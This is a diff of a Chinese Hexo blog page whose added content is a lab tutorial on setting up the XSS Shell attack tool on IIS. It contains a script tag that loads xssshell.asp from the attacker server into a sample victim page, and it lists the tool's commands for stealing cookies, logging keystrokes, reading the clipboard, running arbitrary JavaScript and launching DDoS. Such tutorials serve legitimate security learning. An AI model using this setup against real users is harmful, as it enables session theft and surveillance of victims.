@@ -45,7 +45,7 @@
     
     <title>
         
-            标签: hello | 
+            XSS Shell环境搭建及功能介绍 | 
         
         ssssdl
     </title>
@@ -56,7 +56,7 @@
 
     <meta name="format-detection" content="telephone=no"/>
     <meta name="description" itemprop="description" content="">
-    <meta name="keywords" content="">
+    <meta name="keywords" content=",XSS,XSS Shell">
     <meta name="theme-color" content="#0097A7">
 
     <!-- Disable Fucking Bloody Baidu Tranformation -->
@@ -217,7 +217,7 @@
     <!-- WebAPP Icons -->
     <meta name="mobile-web-app-capable" content="yes">
     <meta name="application-name" content="ssssdl">
-    <meta name="msapplication-starturl" content="http://blog.ssssdl.xyz/tags/hello/">
+    <meta name="msapplication-starturl" content="http://blog.ssssdl.xyz/2019/03/19/XSS-Shell环境搭建及功能介绍/">
     <meta name="msapplication-navbutton-color" content="#0097A7">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-title" content="ssssdl">
@@ -236,13 +236,16 @@
     
 
     <!-- The Open Graph protocol -->
-    <meta property="og:url" content="http://blog.ssssdl.xyz/tags/hello/">
+    <meta property="og:url" content="http://blog.ssssdl.xyz/2019/03/19/XSS-Shell环境搭建及功能介绍/">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="标签: hello | ssssdl">
+    <meta property="og:title" content="XSS Shell环境搭建及功能介绍 | ssssdl">
     <meta property="og:image" content="/img/favicon.png">
     <meta property="og:description" content="">
-    
+    <meta property="og:article:tag" content="XSS"> <meta property="og:article:tag" content="XSS Shell"> 
 
+    
+        <meta property="article:published_time" content="Tue Mar 19 2019 17:21:21 GMT+0800">
+        <meta property="article:modified_time" content="Tue Mar 19 2019 18:19:15 GMT+0800">
     
 
     <!-- The Twitter Card protocol -->
@@ -250,13 +253,43 @@
 
     <!-- Add canonical link for SEO -->
     
-        <link rel="canonical" href="http://blog.ssssdl.xyz/tags/hello/index.html" />
+        <link rel="canonical" href="http://blog.ssssdl.xyz/2019/03/19/XSS-Shell环境搭建及功能介绍/index.html" />
     
 
     <!-- Structured-data for SEO -->
     
         
 
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "BlogPosting",
+    "mainEntityOfPage": "http://blog.ssssdl.xyz/2019/03/19/XSS-Shell环境搭建及功能介绍/index.html",
+    "headline": "XSS Shell环境搭建及功能介绍",
+    "datePublished": "Tue Mar 19 2019 17:21:21 GMT+0800",
+    "dateModified": "Tue Mar 19 2019 18:19:15 GMT+0800",
+    "author": {
+        "@type": "Person",
+        "name": "ssssdl",
+        "image": {
+            "@type": "ImageObject",
+            "url": "/img/avatar.png"
+        },
+        "description": "Hi, nice to meet you"
+    },
+    "publisher": {
+        "@type": "Organization",
+        "name": "ssssdl",
+        "logo": {
+            "@type":"ImageObject",
+            "url": "/img/favicon.png"
+        }
+    },
+    "keywords": ",XSS,XSS Shell",
+    "description": "",
+}
+</script>
 
 
     
@@ -290,98 +323,359 @@
                         </button>
                     
 
-                    <!-- Index Module -->
-<div class="material-index mdl-grid">
-    
-    <div class="locate-thumbnail-symbol"></div>
+                    <!-- Post TOC -->
 
-    <!-- Pin on top -->
+    
+    <!-- Back Button -->
+    <!--
+    <div class="material-back" id="backhome-div" tabindex="0">
+        <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"
+           href="#" onclick="window.history.back();return false;"
+           target="_self"
+           role="button"
+           data-upgraded=",MaterialButton,MaterialRipple">
+            <i class="material-icons" role="presentation">arrow_back</i>
+            <span class="mdl-button__ripple-container">
+                <span class="mdl-ripple"></span>
+            </span>
+        </a>
+    </div>
+    -->
+
+
+    <!-- Left aligned menu below button -->
+    
+    
+    <button id="post-toc-trigger-btn"
+        class="mdl-button mdl-js-button mdl-button--icon">
+        <i class="material-icons">format_list_numbered</i>
+    </button>
+
+    <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#0x00-环境"><span class="post-toc-number">1.</span> <span class="post-toc-text">0x00 环境</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#0x01-配置"><span class="post-toc-number">2.</span> <span class="post-toc-text">0x01 配置</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#IIS配置-如果IIS已经搭好可以跳过"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">IIS配置(如果IIS已经搭好可以跳过)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#XSS-Shell相关配置。"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">XSS Shell相关配置。</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x02-使用介绍"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">0x02 使用介绍</span></a></li></ol></li></ol>
+    </ul>
     
 
-    <!-- Normal Post -->
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
+
+
+
+<!-- Layouts -->
+
+    <!-- Post Module -->
+    <div class="material-post_container">
+
+        <div class="material-post mdl-grid">
+            <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
+
+                <!-- Post Header(Thumbnail & Title) -->
+                
+    <!-- Paradox Post Header -->
     
         
             <!-- Random Thumbnail -->
             <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
+            <script type="text/ls-javascript" id="post-thumbnail-script">
+    var randomNum = Math.floor(Math.random() * 19 + 1);
 
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/2018/05/16/hello-world/">Hello World</a></p>
-    </div>
-
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            Welcome to Hexo
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/2018/05/16/hello-world/" target="_self">阅读全文</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="/img/avatar.png" width="44px" height="44px" alt="ssssdl's avatar">
-            </div>
-            <div>
-                <strong>ssssdl</strong>
-                <span>5月 16, 2018</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-          
-              <!-- Category -->
-              <span class="post_entry-category">
-                  <a class="post_category-link" href="/categories/hello/">hello</a>
-              </span>
-            
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
-        
-    
-
-    
-
-    
-        <script type="text/ls-javascript" id="thumbnail-script">
-    var randomNum;
-
-    var locatePost = $('.locate-thumbnail-symbol').next();
-    for(var i = 0; i < 10; i++) {
-        randomNum = Math.floor(Math.random() * 19 + 1);
-
-        locatePost.children('.post_thumbnail-random').attr('id', 'random_thumbnail-'+randomNum);
-        locatePost.children('.post_thumbnail-random').attr('data-original', '/img/random/material-' + randomNum + '.png');
+    $('.post_thumbnail-random').attr('data-original', '/img/random/material-' + randomNum + '.png');
     $('.post_thumbnail-random').addClass('lazy');
-
-        locatePost = locatePost.next();
-    }
 </script>
 
+        
+    
+            <p class="article-headline-p">
+                XSS Shell环境搭建及功能介绍
+            </p>
+        </div>
+
+
+
+
+
+                
+                    <!-- Paradox Post Info -->
+                    <div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">
+
+    <!-- Author Avatar -->
+    <div id="author-avatar">
+        <img src="/img/avatar.png" width="44px" height="44px" alt="Author Avatar"/>
+    </div>
+    <!-- Author Name & Date -->
+    <div>
+        <strong>ssssdl</strong>
+        <span>3月 19, 2019</span>
+    </div>
+
+    <div class="section-spacer"></div>
+
+    <!-- Favorite -->
+    <!--
+        <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
+            <i class="material-icons" role="presentation">favorite</i>
+            <span class="visuallyhidden">favorites</span>
+        </button>
+    -->
+
+    <!-- Qrcode -->
+    
+
+    <!-- Tags (bookmark) -->
+    
+    <button id="article-functions-viewtags-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+        <i class="material-icons" role="presentation">bookmark</i>
+        <span class="visuallyhidden">bookmark</span>
+    </button>
+    <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
+        <li class="mdl-menu__item">
+        <a class="post_tag-link" href="/tags/XSS/">XSS</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/XSS-Shell/">XSS Shell</a>
+    </ul>
+    
+
+    <!-- Share -->
+    
+        <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">share</i>
+    <span class="visuallyhidden">share</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
+    
+
+    
+        
+            <!-- Busuanzi Views -->
+            <a class="post_share-link" href="#">
+                <li class="mdl-menu__item">
+                    <span id="busuanzi_container_page_pv">
+                        <span id="busuanzi_value_page_pv"></span>&nbsp;浏览量
+                    </span>
+                </li>
+            </a>
+        
+    
+
+    <!-- Share Weibo -->
+    
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=XSS Shell环境搭建及功能介绍&url=http://blog.ssssdl.xyz/2019/03/19/XSS-Shell环境搭建及功能介绍/index.html&pic=http://blog.ssssdl.xyz/img/favicon.png&searchPic=false&style=simple" target="_blank">
+            <li class="mdl-menu__item">
+                分享到微博
+            </li>
+        </a>
+    
+
+    <!-- Share Twitter -->
+    
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=XSS Shell环境搭建及功能介绍&url=http://blog.ssssdl.xyz/2019/03/19/XSS-Shell环境搭建及功能介绍/index.html&via=ssssdl" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Twitter
+            </li>
+        </a>
+    
+
+    <!-- Share Facebook -->
+    
+        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://blog.ssssdl.xyz/2019/03/19/XSS-Shell环境搭建及功能介绍/index.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Facebook
+            </li>
+        </a>
+    
+
+    <!-- Share Google+ -->
+    
+        <a class="post_share-link" href="https://plus.google.com/share?url=http://blog.ssssdl.xyz/2019/03/19/XSS-Shell环境搭建及功能介绍/index.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Google+
+            </li>
+        </a>
+    
+
+    <!-- Share LinkedIn -->
+    
+
+    <!-- Share QQ -->
+    
+        <a class="post_share-link" href="http://connect.qq.com/widget/shareqq/index.html?site=ssssdl&title=XSS Shell环境搭建及功能介绍&summary=&pics=http://blog.ssssdl.xyz/img/favicon.png&url=http://blog.ssssdl.xyz/2019/03/19/XSS-Shell环境搭建及功能介绍/index.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 QQ
+            </li>
+        </a>
+    
+
+    <!-- Share Telegram -->
+    
+</ul>
+
     
 </div>
+
+                
+
+                <!-- Post Content -->
+                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
+    
+        <blockquote>
+<p>感觉网上这个工具的介绍相对BeEF好像比较少，我自己搭建的时候也走了很多弯路</p>
+</blockquote>
+<h1 id="0x00-环境"><a href="#0x00-环境" class="headerlink" title="0x00 环境"></a>0x00 环境</h1><blockquote>
+<p>因为这是一个asp的工具，所以这里我采用了一个Windows server 2008 R2 的系统（Windows7什么的也可以）、IIS7的服务器，然后XSS shell来自<a href="https://github.com/portcullislabs/xssshell-xsstunnell" target="_blank" rel="noopener">GitHub</a>,然后因为XSS Shell会将攻击取得的一些数据存入一个shell.mdb的文件，因此如果需要分析的话也需要一个MS Access，但是其实我觉得没有的话也完全没问题，因为我觉得这种工具都是在用户打开被攻击的网页时的一种实时攻击。shell.mdb也可以随时拷到可以分析的机器上。所以攻击服务器上没有也完全没有问题。（说的有点啰嗦）</p>
+</blockquote>
+<h1 id="0x01-配置"><a href="#0x01-配置" class="headerlink" title="0x01 配置"></a>0x01 配置</h1><h2 id="IIS配置-如果IIS已经搭好可以跳过"><a href="#IIS配置-如果IIS已经搭好可以跳过" class="headerlink" title="IIS配置(如果IIS已经搭好可以跳过)"></a>IIS配置(如果IIS已经搭好可以跳过)</h2><p><em>IIS这个东西可真是令人头大，图形界面真是好用~     。。。。。。。。。。。。个锤子！</em></p>
+<blockquote>
+<p>直接虚拟机装一个Windows server 2008 R2，然后会默认打开一个初始配置任务，里面自定义此服务器，选择添加角色，然后弹出的面板上面选上IIS，下一步，选上一些关于asp的拓展（ASP,ISAPI扩展，ASP.NET,.NET扩展等），然后安装。然后注意连接的用户要对目录有操作权限，不然可能实验的时候被攻击的浏览器已经打开含有XSS的网页，但是管理员端不显示上线。</p>
+</blockquote>
+<p><strong>注意：以上配置完成后要打开IIS管理器，点击应用程序池，选择右侧的设置应用程序池默认设置，然后把启用32位程序改成ture！</strong></p>
+<h2 id="XSS-Shell相关配置。"><a href="#XSS-Shell相关配置。" class="headerlink" title="XSS Shell相关配置。"></a>XSS Shell相关配置。</h2><ol>
+<li><p>解压GitHub上下载下来的压缩包。有一个XSS Shell的文件夹，存放XSS Shell的asp网站，和监听工具XSSTunnel和这个工具的介绍的PDF文件。</p>
+</li>
+<li><p>打开IIS管理器，打开default web site浏览一下看看网站是否正常运行。如果网页上出现了IIS的logo，没什么异常，就打开default web site的本地目录（默认C:\inetpub\wwwroot），然后把原来的文件删掉（或者备份），把刚才解压出来的XSS shell目录下的文件拷到web目录下。然后把db文件夹剪切到其他不能web访问的目录比如C盘根目录下。</p>
+</li>
+<li><p>接下来开始配置需要配置的文件有xssshell.asp和admin/db.asp</p>
+<blockquote>
+<p>admin/db.asp 这里改成刚才剪切走的db文件夹的位置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;// DATABASE CONFIGURATION</span><br><span class="line">Const DBPATH = &quot;C:\db\shell.mdb&quot;</span><br></pre></td></tr></table></figure>
+</blockquote>
+</li>
+</ol>
+<blockquote>
+<p>admin/db.asp 这里w00t是默认密码，可以根据自己的阿需要修改<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&apos;// Set Session + password is Case Sensitive</span><br><span class="line">If Pass &lt;&gt; &quot;&quot; Then</span><br><span class="line">	If Trim(Pass) = &quot;w00t&quot; Then Session(&quot;level&quot;) = &quot;ok&quot;</span><br><span class="line">	&apos;Response.Redirect &quot;&quot;</span><br><span class="line">End If</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>xssshell.asp 这里是服务器的链接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// You XSSShell Server</span><br><span class="line">var SERVER = &quot;http://192.168.153.132/&quot;; </span><br><span class="line"></span><br><span class="line">// This file&apos;s name</span><br><span class="line">var ME = SERVER + &quot;xssshell.asp?p=1&lt;%=VicAdd%&gt;&quot; ; </span><br><span class="line"></span><br><span class="line">// Connector file</span><br><span class="line">var CONNECTOR = SERVER + &quot;admin/connector.asp&quot;; </span><br><span class="line"></span><br><span class="line">// Commands file</span><br><span class="line">var COMMANDS_URL = SERVER + &quot;admin/commands.asp&quot;;</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>到这里关于xss shell的基本的配置就完成了，xss shell还为我们准备了一个测试页面(/sample_victim目录下的页面)，需要接下来的配置。打开/sample_victim/Default.asp大概在九十几行的位置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://www.xssshelltest.com:60000/xssshell.asp&quot;&gt;&lt;/script&gt;</span><br><span class="line">//改成你已经配置好的服务器地址</span><br><span class="line">&lt;script src=&quot;http://192.168.153.132/xssshell.asp&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<p><strong>到这里服务器的配置就基本完成了，接下来用其他的浏览器（server 2008自带的浏览器不知道为什么刷新不出内容）打开<a href="http://192.168.153.132/admin" target="_blank" rel="noopener">http://192.168.153.132/admin</a></strong></p>
+<h2 id="0x02-使用介绍"><a href="#0x02-使用介绍" class="headerlink" title="0x02 使用介绍"></a>0x02 使用介绍</h2><p><img src="https://i.loli.net/2019/03/19/5c90a8cdc9821.png" alt="直接翻译，就不解释每个模块都是干什么了"></p>
+<blockquote>
+<p>直接上翻译好的界面，点一下左边的命令受害主机就会执行相应的操作，显示在日志里面，然后有一些比较长的内容点击一下会显示在下面的查看器里面，然后想alert()这种需要参数的，可以写在下面的参数模块里面。。。感觉也没什么好说的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">getCookie()  //获取cookie</span><br><span class="line">Get victims active cookie</span><br><span class="line">getSelfHtml()   //获取页面html，结果是16进制编码过的</span><br><span class="line">Get victim&apos;s current page HTML Code</span><br><span class="line">alert(&lt;message&gt;)  // 弹框 ， 要添加弹框的内容</span><br><span class="line">Send message to victim</span><br><span class="line">eval(&lt;javascript code&gt;) //执行js</span><br><span class="line">Execute virtually anything in JS</span><br><span class="line">prompt(&lt;question&gt;)  //弹输入框，添加弹框的标题，会把受害者的输入写在log里面，有点聊天的感觉</span><br><span class="line">Play Truth or Dare</span><br><span class="line">getKeyloggerData()//键盘记录，有时候可能没什么效果</span><br><span class="line">Get keylogger data</span><br><span class="line">getMouseLog() //获取鼠标点击，和键盘记录一样，有时候可能没有效果</span><br><span class="line">Get mouse log (every click in screen)</span><br><span class="line">getClipboard() //获取剪切板数据，仅限IE</span><br><span class="line">Get clipboard data (only IE)</span><br><span class="line">getInternalIP() // 获取内网IP</span><br><span class="line">Get internal IP address (only Mozilla* + JVM)</span><br><span class="line">checkVisitedLinks(&lt;url list&gt;) //应该是测试受害者是否访问过某网址的（参数是url），但是好像也并不怎么准</span><br><span class="line">Check victim&apos;s history (seperated by new line)</span><br><span class="line">getPage(&lt;Relative URL Path&gt;) //用受害者的平局请求某网页，这个得到的网页不是16进制的,不同源会被拦截掉（火狐：已拦截跨源请求：同源策略禁止读取位于 https://www.bilibili.com/bangumi/play/ep62691v 的远程资源。（原因：CORS 请求未能成功））</span><br><span class="line">Make a request with victim credentials</span><br><span class="line">DDoS(&lt;url&gt;)  \\DDos 某URL（参数） 这个原理好像就是上一篇博客里面最后那个大佬的博客里面的原理（这句话有点绕）</span><br><span class="line">Distributed Denial of Service attack (use &#123;RANDOM&#125; in URL to avoid caching)</span><br><span class="line">Crash()  \\崩溃当前网页，一般不会cpu占用太高（使用7700HQ测试，cpu内心毫无波动，就是网页崩掉了）</span><br><span class="line">Consume victim&apos;s CPU and force to crash/close.</span><br><span class="line">GetLocation() \\获取当前URL （应该就是被攻击者XSS攻击的URL）</span><br><span class="line">Get current URL of victim.</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>以上测试被攻击者是火狐，admin在谷歌。其他浏览器。。。未测试。。。</p>
+</blockquote>
+
+        
+    
+
+    
+</div>
+
+
+                
+
+                <!-- Post Comments -->
+                
+                    
+    <!-- 使用 DISQUS_CLICK -->
+<div id="disqus-comment">
+    <div id="disqus_thread"></div>
+
+<!-- add animation -->
+<style>
+	.disqus_click_btn {
+            line-height: 30px;
+            margin: 0;
+            min-width: 50px;
+            padding: 0 14px;
+            display: inline-block;
+            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
+            font-size: 14px;
+            font-weight: 400;
+            text-transform: uppercase;
+            letter-spacing: 0;
+            overflow: hidden;
+            will-change: box-shadow;
+            transition: box-shadow .2s cubic-bezier(.4, 0, 1, 1), background-color .2s cubic-bezier(.4, 0, .2, 1), color .2s cubic-bezier(.4, 0, .2, 1);
+            outline: 0;
+            cursor: pointer;
+            text-decoration: none;
+            text-align: center;
+            vertical-align: middle;
+            border: 0;
+            background: rgba(158, 158, 158, .2);
+            box-shadow: 0 2px 2px 0 rgba(0, 0, 0, .14), 0 3px 1px -2px rgba(0, 0, 0, .2), 0 1px 5px 0 rgba(0, 0, 0, .12);
+            color: #fff;
+            background-color: #757575;
+            text-shadow: 0;
+            display: none
+        }
+</style>
+	
+<div class="btn_click_load"> 
+    <button class="disqus_click_btn">阅读评论（请确保 disqus 可以正常加载）</button>
+</div>
+
+<script type="text/javascript">
+    var disqus_config = function () {
+        this.page.url = 'http://blog.ssssdl.xyz/2019/03/19/XSS-Shell环境搭建及功能介绍/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = 'http://blog.ssssdl.xyz/2019/03/19/XSS-Shell环境搭建及功能介绍/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+</script>
+
+<script type="text/ls-javascript" id="disqus-lazy-load-script">
+    $.ajax({
+        url: 'https://disqus.com/next/config.json',
+        timeout: 4000,
+        type: 'GET',
+        success: (function() {
+            var d = document;
+            var s = d.createElement('script');
+            s.src = '//ssssdl.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', + new Date());
+            (d.head || d.body).appendChild(s);
+            $('.disqus_click_btn').css('display','none');
+        })(),
+        error: function() {
+          $('.disqus_click_btn').css('display','block');
+        }
+    });
+    $('.btn_click_load').click(function() {  //click to load comments
+        (function() { // DON'T EDIT BELOW THIS LINE
+            var d = document;
+            var s = d.createElement('script');
+            s.src = '//ssssdl.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', + new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+        $('.disqus_click_btn').css('display','none');
+    });
+</script>
+  	
+
+</div>
+<style>
+    #disqus-comment{
+        background-color: #eee;
+        padding: 2pc;
+    }
+</style>
+
+                
+            </div>
+
+            <!-- Post Prev & Next Nav -->
+            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
+    <!-- Prev Nav -->
+    
+
+    <!-- Section Spacer -->
+    <div class="section-spacer"></div>
+
+    <!-- Next Nav -->
+    
+        <a href="/2019/03/18/重新认识XSS/" id="post_nav-older" class="next-content">
+            旧篇
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_forward</i>
+            </button>
+        </a>
+    
+</nav>
+
+        </div>
+    </div>
+
 
 
                     
@@ -575,6 +869,14 @@ It will not impact the appearance and can give developers a lot of support :)
 </aside>
 
                     
+
+                    
+                        <!-- Footer Top Button -->
+                        <div id="back-to-top" class="toTop-wrap">
+    <a href="#top" class="toTop">
+        <i class="material-icons footer_top-i">expand_less</i>
+    </a>
+</div>
 
                     
 
